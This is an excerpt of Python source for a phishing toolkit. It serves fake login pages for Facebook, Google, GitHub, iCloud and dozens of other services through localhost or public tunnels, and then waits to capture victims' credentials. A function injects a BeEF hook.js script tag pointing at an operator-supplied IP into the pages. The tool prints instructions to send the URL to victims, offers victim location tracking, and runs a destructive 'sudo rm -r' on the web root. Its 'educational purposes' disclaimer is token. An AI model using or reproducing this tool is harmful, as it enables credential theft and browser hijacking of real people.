...
def runPhishing(page, customOption):  # Phishing pages selection menu
    ...
    if customOption == '1' and page == 'Facebook':
        ...
        print("\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/Fbmobile".format(MAIN0, MAIN4))
        print("\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/Fbmobile]".format(MAIN0, MAIN4))
        ...
        sleep(3)
        copy_tree('WebPages/Fbmobile/', "Server/www/")
    elif page == 'CUSTOM(2)':
...
def selectServer(port):  # Question where user must select server
    ...
    print("\n {0}[{1}0{0}]{1}LOCALHOST(for beef hooks only) \n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo (Currently DOWN)\n {0}[{1}3{0}]{1}Localxpose [Not good for me]\n {0}[{1}4{0}]{1}Localtunnel [Currently DOWN]\n {0}[{1}5{0}]{1}Localtunnel [Currently DOWN]\n {0}[{1}6{0}]{1}OpenPort [not good for me]\n {0}[{1}7{0}]{1}Pagekite [ Not Good for me ] \n".format(MAIN0, MAIN2))
...
def runLocalhost(port):
    ...
    system("sudo rm -r /var/www/html/&&sudo mkdir /var/www/html/&&cd Server/www/") 
    copy_tree("Server/www/", "/var/www/html/")
    system("cd /var/www/html/&&php -S {0}:{1} > /dev/null 2>&1 &".format(host, port))
    ...
    print("\n"+"[!] SEND THIS URL TO THE VICTIMS ON SAME NETWORK OR OUT NETWORK !! Please note that you should turn on beef framework and interact with them at beef not here :) "+"\n"+"[*] URL: http://{}".format(host))
    print("\n")
    print("[*] To get menu for do any change please use ctrl+C")
...
def manageOpenporturl(port): # Its all about How we generate a url from openport, & How we used grep & curl to get a url to shown on final panel of script.
	...
	try:
		...
		system('cat openport.txt | grep https://www.openport.io/l/...................... -oh > urltoverify.txt') # Taking spr out the neccesary verification link from output txt file of openport (above). 
		print('[*] Getting the verification link of openurl tunnel.')
		with open('urltoverify.txt') as f:
			read_data = f.read()
			if 'https://www.openport.io/l/' in read_data:
		...
		with open('filename.txt', 'r') as f:
			read_data = f.read()
		c = read_data.replace('', ' | grep http://www.openport.io:..... -oh > mixedurl.txt')
		f = open('filename.txt', 'w')
		f.write(c)
		f.close()
		with open('filename.txt', 'r') as f:
...
def runLT(port, npm):
    ...
    try:
        ...
        print('{0}error[!]invalid{0}'.format(MAIN0))
        runLT(port, npm)


def runMainMenu():  # menu where user select what they wanna use
    # Terms Of Service
    print("           *************************************************************************\n              This is tool for just educational purposes not for script kiddies :)      \n           **************************************************************************")
    if input("\n\n\n\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational/testing purposes only? ({0}Y{1}/{2}N{1})\n{2}Your choice : {0}".format(MAIN2, MAIN4, MAIN0)).upper() != 'Y':
        system('clear')
...
def mainMenu():
    ...
    print(" {0}({1}2{0}){1} Google         {0}({1}14{0}){1} VK             {0}[{1}26{0}]{1} CryptoCurrency  {0}({1}38{0}){1} Xbox".format(
        MAIN0, MAIN2))
    print(" {0}({1}3{0}){1} LinkedIn       {0}({1}15{0}){1} iCloud         {0}({1}27{0}){1} DevianArt       {0}({1}39{0}){1} Fbmobile".format(
        MAIN0, MAIN2))
    print(" {0}({1}4{0}){1} GitHub         {0}({1}16{0}){1} GitLab         {0}({1}28{0}){1} DropBox         {0}({1}40{0}){1} CUSTOM(2)".format(
        MAIN0, MAIN2))
    ...
    print(" {0}({1}12{0}){1} Microsoft      {0}({1}24{0}){1} Adobe          {0}({1}36{0}){1} Subito.it ".format(
        MAIN0, MAIN2))
    print("\n{0}choose your fake page :".format(MAIN0, MAIN2))
    print(" {0}[{1}L{0}]{1} Get Victim Location".format(MAIN0, MAIN2))

    option = input("\n{0}Your choice :  {1}".format(MAIN0, MAIN2))
    if option == '1' or option == '01':
        loadModule('Facebook')
        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}Your choice : {2}".format(MAIN0, MAIN2, MAIN2))
        ...
        loadModule('Fbmobile')
        customOption = ''
        runPhishing('Fbmobile', customOption)
    elif option == '40':
        loadModule('CUSTOM(2)')
        customOption = ''
...
def inputCustom():  # Question where user can input custom web-link
    ...
    print(
        '''\n{0}[{1}*{0}]{0}Insert a custom redirect url like (google.com) :'''.format(MAIN0, MAIN4))
...
def addingkeylogger():
    print("\n{0}[{1}!{0}]{1} Adding Beef hook May be Kills the Tunnel Connection.please note that you should turn on beef framework \n".format(
        MAIN0, MAIN4))
    print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A Beef Hook IN PHISHING PAGE{1}(Y/N)".format(MAIN0, MAIN4))
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(
        MAIN0, MAIN4, MAIN2)).upper()
    if choice == 'Y':
        addkeylogger()
...
def addkeylogger():
    colorip=colored("Enter private ip/public ip : ","red")
    ipbeef=input("{}".format(colorip))
    if path.exists('Server/www/index.html'):
        with open('Server/www/index.html') as f:
            read_data = f.read()
        c = read_data.replace(
            '</body>', '</body><script src="http://{}:3000/hook.js"></script>'.format(ipbeef))
        f = open('Server/www/index.html', 'w')
        f.write(c)
        f.close()
        
        print("\n{0}[{1}#{0}]Beef Hook{0} ADDED !!!".format(MAIN0, MAIN4))
        sleep(2)
    ...
    if path.exists('Server/www/mobile.html'):
        with open('Server/www/mobile.html') as f:
            read_data = f.read()
        c = read_data.replace(
            '</body>', '</body><script src="http://{}:3000/hook.js"></script>'.format(ipbeef))
        f = open('Server/www/mobile.html', 'w')
        f.write(c)
        f.close()
        print("\n{0}[{1}#{0}]Beef Hook{0} ADDED !!!".format(MAIN0, MAIN4))
        sleep(2)
    ...
    if path.exists('Server/www/index.php'):
...
def getCredentials(port):
    ...
    print("{0}[{1}*{0}]{1} Waiting For Victim Interaction. Please Don't use it for evil purposes :( ... \n{2}________________________________________________________________________________\n".format(MAIN0, MAIN2, MAIN4))
    while True:
